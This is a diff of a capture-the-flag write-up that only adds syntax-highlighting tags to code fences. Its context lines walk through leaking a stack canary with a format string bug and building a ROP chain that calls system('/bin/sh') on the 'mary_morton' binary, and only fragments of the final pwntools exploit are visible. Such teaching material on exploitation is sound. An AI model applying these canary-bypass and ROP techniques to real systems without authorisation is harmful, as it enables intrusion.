@@ -2,7 +2,7 @@
 
 So after we download and extract the file, we have a binary. Let's take a look at the binary (also one thing, I slightly modified this binary, but we'll cover that in more detail later):
 
-```
+```console
 $    file mary_morton
 mary_morton: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=b7971b84c2309bdb896e6e39073303fc13668a38, stripped
 $    pwn checksec mary_morton
@@ -16,7 +16,7 @@ $    pwn checksec mary_morton
 
 So we see that it is a 64 bit Elf, with a stack canary and non executable stack. Let's see what happens when we run the binary:
 
-```
+```console
 $    ./mary_morton
 Welcome to the battle !
 [Great Fairy] level pwned
@@ -35,7 +35,7 @@ Alarm clock
 
 So we see we are given a prompt for a Buffer Overflow, format string, or just to exit the battle. We confirmed that the format string bug indeed works with the `%x` flags. We can also that there is an alarm feature which will kill the program after a set amount of time. We can run it in gdb, that way when the Alarm Clock triggers it won't kill the program.
 
-```
+```gdb
 gef➤  r
 Starting program: /Hackery/pod/modules/ret_2_system/asis17_marymorton/mary_morton 
 Welcome to the battle ! 
@@ -58,7 +58,7 @@ So we also verified that the buffer overflow bug is legit. Let's take a look at 
 
 Looking through the list of functions in Ghidra, we find this one at `0x400826`:
 
-```
+```c
 
 void menu(void)
 
@@ -93,7 +93,7 @@ void menu(void)
 
 So we can see here the function prints out the starting prompt, then enters into a loop where it will print out the menu options, then scan in input. Based upon the input, it will either trigger the `fmtBug` function, `overflowBug` function, or just exit the program. Let's take a look at the `fmtBug` function.
 
-```
+```c
 void fmtBug(void)
 
 {
@@ -123,7 +123,7 @@ void fmtBug(void)
 
 So we can see here, it pretty much does what we expected. It first clears out a space of memory, then scans in input to that space (`0x7f` bytes). Proceeding that it prints it unformatted using `printf` to have a format string vulnerability. Let's take a look at the `overflowBug`:
 
-```
+```c
 void overflowBug(void)
 
 {
@@ -153,7 +153,7 @@ void overflowBug(void)
 
 Looking at this, we can see that it reads in `0x100` (`256`) bytes of data into the buffer that Ghidra says only has `17` bytes. Thing is, when we look at the stack layout we see that the buffer is bigger than that:
 
-```
+```c
                              **************************************************************
                              *                          FUNCTION                          *
                              **************************************************************
@@ -177,7 +177,7 @@ So we can see that `input` is at offset `-0x98`, and that `canary` is at offset 
 In order to reach the return address to gain code flow execution, we will have to write over the stack canary. Before we do that, we will need to leak the stack canary, so we can write over the stack canary with itself. That way when the stack canary is checked, everything will check out. We should be able to accomplish this using the format string exploit to leak an address. Also as a sidenote we could probably use the buffer overflow function to leak the stack canary, by overflowing up right up to the stack canary. Then when it prints out the input it leaks the stack canary. However the issue with that is that we would need to overwrite the null byte of the stack canary, and it would check the canary before we had a chance to correct it. So I went for using the format string bug to leak the canary. We can find the offset for the format string to the stack canary using gdb.
 
 First set a breakpoint for the stack canary check in the `format_string_vuln` function, then run that function, then leak a bunch of 8 byte hex strings:
-```
+```gdb
 gef➤  b *0x40094a
 Breakpoint 1 at 0x40094a
 gef➤  r
@@ -195,7 +195,7 @@ Select your weapon
 
 So a stack canary for 64 bit systems is an 8 byte hex string that ends in a null byte. Looking through the output, we can see such a hex string at offset 23 with `217c6cddb9f90f00`. We can confirm that this is the stack canary once we reach the breakpoint by examining the value of `rbp-0x8`, since from the source code we can see  that is where the canary is:
 
-```
+```gdb
 Breakpoint 1, 0x000000000040094a in ?? ()
 gef➤  lx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.
 Undefined command: "lx".  Try "help".
@@ -216,7 +216,7 @@ So we can see that it is indeed the stack canary, which is at offset 23. We can 
 
 The next thing we will need to deal with is the Non-Executable stack. Since it is Non-Executable, we can't simply push shellcode onto the stack and execute it, so we will need to use ROP in order to execute code. Looking at the imports in Ghidra (`Imports>EXTERNAL`), we can see that system is in there. So we should be able to call system using it's `plt` address. First we need to find it, which can be accomplished by using objdump:
 
-```
+```console
 objdump -D mary_morton | grep system
 00000000004006a0 <system@plt>:
   4008e3:    e8 b8 fd ff ff           callq  4006a0 <system@plt>
@@ -224,13 +224,13 @@ objdump -D mary_morton | grep system
 
 So the address of system is `0x4006a0`. The next thing that we will need is a ROP gadget which will pop an argument into a register for system, then return to call it. We can accomplish this by using ROPgadget:
 
-```
+```console
 $    ROPgadget --binary mary_morton | less
 ```
 
 Looking through the list of ROPgadgets, we can see one that will accomplish the job:
 
-```
+```nasm
 0x0000000000400ab3 : pop rdi ; ret
 ```
 
@@ -238,7 +238,7 @@ So we have a ROPgadget, and the address of system which we can call. The only th
 
 First set a breakpoint for anywhere in the program, then hit it
 
-```
+```gdb
 gef➤  b *0x400826
 Breakpoint 1 at 0x400826
 gef➤  r
@@ -247,7 +247,7 @@ Starting program: /Hackery/pod/modules/ret_2_system/asis17_marymorton/mary_morto
 
 then once you reach the breakpoint:
 
-```
+```gdb
 Breakpoint 1, 0x0000000000400826 in ?? ()
 gef➤  find /bin/sh
 Invalid size granularity.
@@ -268,7 +268,7 @@ We can see here that the binary has the string `"/bin/sh"` is hardcoded at `0x40
 
 With all of those things, we can write the python exploit:
 
-```
+```python
 #First import pwntools
 from pwn import *
 
@@ -306,7 +306,7 @@ target.interactive()
 
 When we run the exploit:
 
-```
+```console
 [+] Starting local process './mary_morton_patched': pid 1719
 [*] running in new terminal: /usr/bin/gdb -q  "./mary_morton_patched" 1719 -x "/tmp/pwnhoGB4g.gdb"
 [+] Waiting for debugger: Done
